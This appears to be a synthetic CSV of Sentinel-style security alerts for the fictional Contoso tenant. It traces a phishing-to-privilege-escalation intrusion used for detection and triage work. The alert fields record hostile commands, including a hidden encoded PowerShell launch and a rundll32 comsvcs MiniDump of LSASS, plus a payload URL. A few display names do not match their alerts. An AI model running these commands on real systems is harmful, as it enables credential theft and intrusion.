TimeGenerated,StartTime,EndTime,SystemAlertId,AlertName,DisplayName,AlertType,AlertSeverity,ProviderName,ProductName,VendorName,Status,CompromisedEntity,Tactics,Techniques,Entities,ExtendedProperties,IsIncident
2026-06-10T08:08:30Z,2026-06-10T08:05:11Z,2026-06-10T08:05:12Z,11111111-0001-0000-0000-00000000a001,Phishing email detected during delivery,Phishing email detected during delivery,ZapPhishCampaign,Medium,OATP,Microsoft Defender for Office 365,Microsoft,New,alexw@contoso.com,InitialAccess,"[""T1566.002""]","[{""$id"":""1"",""Type"":""mailbox"",""MailboxPrimaryAddress"":""alexw@contoso.com"",""Upn"":""alexw@contoso.com""},{""$id"":""2"",""Type"":""account"",""Name"":""alexw"",""UPNSuffix"":""contoso.com""},{""$id"":""3"",""Type"":""mailMessage"",""NetworkMessageId"":""7f3e2a1b-9c4d-4e6f-8a2b-1d3c5e7f9a0b"",""Subject"":""Action required: verify your Contoso SSO sign-in"",""P1Sender"":""security-alert@login-contoso-sso.com"",""RecipientEmailAddress"":""alexw@contoso.com""},{""$id"":""4"",""Type"":""url"",""Url"":""https://login-contoso-sso.com/verify""}]","{""NetworkMessageIds"":""7f3e2a1b-9c4d-4e6f-8a2b-1d3c5e7f9a0b"",""Recipients"":""alexw@contoso.com;priya.menon@contoso.com"",""SenderIp"":""91.219.236.18"",""DeliveryAction"":""Delivered"",""ThreatType"":""Phish""}",false
2026-06-10T08:23:14Z,2026-06-10T08:17:05Z,2026-06-10T08:20:36Z,11111111-0002-0000-0000-00000000a002,Atypical travel,Sign-in from a risky IP address,RiskySignIn,Medium,IPC,Azure Active Directory Identity Protection,Microsoft,New,alexw@contoso.com,InitialAccess,"[""T1078.004""]","[{""$id"":""1"",""Type"":""account"",""Name"":""alexw"",""UPNSuffix"":""contoso.com"",""AadUserId"":""6c3d4a55-3333-4c4c-9d9d-aa0000000203""},{""$id"":""2"",""Type"":""ip"",""Address"":""185.220.101.2"",""Location"":{""CountryCode"":""NL"",""City"":""Amsterdam""}}]","{""RiskLevel"":""high"",""RiskEventType"":""anonymizedIPAddress;maliciousIPAddress"",""SignInDateTime"":""2026-06-10T08:20:36Z"",""ClientApp"":""Browser"",""UserPrincipalName"":""alexw@contoso.com""}",true
2026-06-10T08:39:02Z,2026-06-10T08:35:17Z,2026-06-10T08:35:17Z,11111111-0003-0000-0000-00000000a003,Suspicious remote logon to a workstation,Suspicious remote logon to a workstation,WindowsDefenderAtp,Medium,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,New,FIN-WS-07,LateralMovement,"[""T1021.001""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""FIN-WS-07"",""NetBiosName"":""FIN-WS-07"",""AzureID"":""d1d1d1d1-aaaa-bbbb-cccc-000000000007"",""OSFamily"":""Windows""},{""$id"":""2"",""Type"":""account"",""Name"":""alexw"",""NTDomain"":""CONTOSO"",""Sid"":""S-1-5-21-1111111111-2222222222-3333333333-1142""},{""$id"":""3"",""Type"":""ip"",""Address"":""185.220.101.2""}]","{""LogonType"":""RemoteInteractive"",""RemoteIP"":""185.220.101.2"",""DeviceName"":""FIN-WS-07"",""AccountName"":""alexw""}",true
2026-06-10T08:47:55Z,2026-06-10T08:41:20Z,2026-06-10T08:41:20Z,11111111-0004-0000-0000-00000000a004,Suspicious PowerShell command line,Suspicious PowerShell command line,WindowsDefenderAtp,High,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,New,FIN-WS-07,Execution,"[""T1059.001""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""FIN-WS-07"",""AzureID"":""d1d1d1d1-aaaa-bbbb-cccc-000000000007"",""OSFamily"":""Windows""},{""$id"":""2"",""Type"":""account"",""Name"":""alexw"",""NTDomain"":""CONTOSO"",""Sid"":""S-1-5-21-1111111111-2222222222-3333333333-1142""},{""$id"":""3"",""Type"":""process"",""ProcessId"":""6184"",""CommandLine"":""powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA""},{""$id"":""4"",""Type"":""file"",""Name"":""powershell.exe"",""Directory"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0""}]","{""ProcessName"":""powershell.exe"",""CommandLine"":""powershell.exe -nop -w hidden -enc SQBFAFgA..."",""ParentProcess"":""winword.exe"",""DeviceName"":""FIN-WS-07""}",true
2026-06-10T08:52:40Z,2026-06-10T08:48:09Z,2026-06-10T08:48:09Z,11111111-0005-0000-0000-00000000a005,Suspicious download of a remote payload,Suspicious download of a remote payload,WindowsDefenderAtp,Medium,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,New,FIN-WS-07,CommandAndControl,"[""T1105""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""FIN-WS-07"",""AzureID"":""d1d1d1d1-aaaa-bbbb-cccc-000000000007""},{""$id"":""2"",""Type"":""file"",""Name"":""update.bin"",""Directory"":""C:\\Users\\alexw\\AppData\\Local\\Temp""},{""$id"":""3"",""Type"":""url"",""Url"":""http://badupdate-cdn.com/payload/update.bin""},{""$id"":""4"",""Type"":""ip"",""Address"":""91.219.236.18""}]","{""FileName"":""update.bin"",""RemoteUrl"":""http://badupdate-cdn.com/payload/update.bin"",""DeviceName"":""FIN-WS-07"",""SHA256"":""9f2c4b7e1a3d5f8c0b6e9a2d4f7c1b8e3a6d9c2f5b8e1a4d7c0f3b6e9a2d5c8f""}",true
2026-06-10T09:09:21Z,2026-06-10T09:03:44Z,2026-06-10T09:03:44Z,11111111-0006-0000-0000-00000000a006,Sensitive credential memory read (LSASS access),Sensitive credential memory read,WindowsDefenderAtp,High,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,InProgress,FIN-WS-07,CredentialAccess,"[""T1003.001""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""FIN-WS-07"",""AzureID"":""d1d1d1d1-aaaa-bbbb-cccc-000000000007""},{""$id"":""2"",""Type"":""account"",""Name"":""alexw"",""NTDomain"":""CONTOSO"",""Sid"":""S-1-5-21-1111111111-2222222222-3333333333-1142""},{""$id"":""3"",""Type"":""process"",""ProcessId"":""4920"",""CommandLine"":""rundll32.exe comsvcs.dll, MiniDump 712 C:\\Temp\\lsass.dmp full""},{""$id"":""4"",""Type"":""file"",""Name"":""lsass.exe"",""Directory"":""C:\\Windows\\System32""}]","{""TargetProcess"":""lsass.exe"",""AccessingProcess"":""rundll32.exe"",""DeviceName"":""FIN-WS-07"",""GrantedAccess"":""0x1410""}",true
2026-06-10T08:58:33Z,2026-06-10T08:50:02Z,2026-06-10T08:54:40Z,11111111-0007-0000-0000-00000000a007,SSH brute force attempts succeeded,SSH brute force attempts succeeded,SSHBruteForce,Medium,Microsoft Defender for Cloud,Azure Security Center,Microsoft,New,WEB-APP-01,CredentialAccess,"[""T1110.001""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""WEB-APP-01"",""OSFamily"":""Linux""},{""$id"":""2"",""Type"":""ip"",""Address"":""91.219.236.18""},{""$id"":""3"",""Type"":""account"",""Name"":""root""}]","{""FailedAttempts"":""214"",""SuccessfulLogon"":""true"",""AttackerIp"":""91.219.236.18"",""AccountName"":""root"",""HostName"":""WEB-APP-01""}",false
2026-06-10T09:22:48Z,2026-06-10T09:15:06Z,2026-06-10T09:18:30Z,11111111-0008-0000-0000-00000000a008,Communication with a possible malicious domain (DGA),Digital currency mining related behavior detected,DNS_C2,Medium,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,New,FIN-WS-07,CommandAndControl,"[""T1568.002""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""FIN-WS-07"",""AzureID"":""d1d1d1d1-aaaa-bbbb-cccc-000000000007""},{""$id"":""2"",""Type"":""dnsResolution"",""DomainName"":""a8f3k2.badupdate-cdn.com""},{""$id"":""3"",""Type"":""ip"",""Address"":""91.219.236.18""}]","{""QueryName"":""a8f3k2.badupdate-cdn.com"",""QueryType"":""A"",""NxDomainCount"":""37"",""DeviceName"":""FIN-WS-07""}",true
2026-06-10T09:06:18Z,2026-06-10T09:00:51Z,2026-06-10T09:00:51Z,11111111-0009-0000-0000-00000000a009,Multiple failed logons followed by a successful logon (DC),Suspicious authentication activity,WindowsDefenderAtp,Medium,MDATP,Microsoft Defender Advanced Threat Protection,Microsoft,New,DC01,LateralMovement,"[""T1110.003""]","[{""$id"":""1"",""Type"":""host"",""HostName"":""DC01"",""NetBiosName"":""DC01"",""OSFamily"":""Windows""},{""$id"":""2"",""Type"":""account"",""Name"":""alexw"",""NTDomain"":""CONTOSO"",""Sid"":""S-1-5-21-1111111111-2222222222-3333333333-1142""},{""$id"":""3"",""Type"":""ip"",""Address"":""185.220.101.2""}]","{""FailedLogonCount"":""18"",""SuccessLogon"":""true"",""TargetHost"":""DC01"",""AccountName"":""alexw""}",true
2026-06-10T10:04:57Z,2026-06-10T10:00:12Z,2026-06-10T10:00:12Z,11111111-000a-0000-0000-00000000a00a,Anomalous granting of permissions to an account,Suspicious role assignment to a privileged role,ARM_AnomalousRBAC,High,Microsoft Defender for Cloud,Azure Security Center,Microsoft,New,/subscriptions/11112222-3333-4444-5555-666677778888/resourceGroups/rg-finance-prod,PrivilegeEscalation,"[""T1098.003""]","[{""$id"":""1"",""Type"":""account"",""Name"":""alexw"",""UPNSuffix"":""contoso.com"",""AadUserId"":""6c3d4a55-3333-4c4c-9d9d-aa0000000203""},{""$id"":""2"",""Type"":""azureResource"",""ResourceId"":""/subscriptions/11112222-3333-4444-5555-666677778888/resourceGroups/rg-finance-prod""},{""$id"":""3"",""Type"":""ip"",""Address"":""185.220.101.2""}]","{""Operation"":""Microsoft.Authorization/roleAssignments/write"",""RoleName"":""Owner"",""Caller"":""alexw@contoso.com"",""CallerIpAddress"":""185.220.101.2""}",true
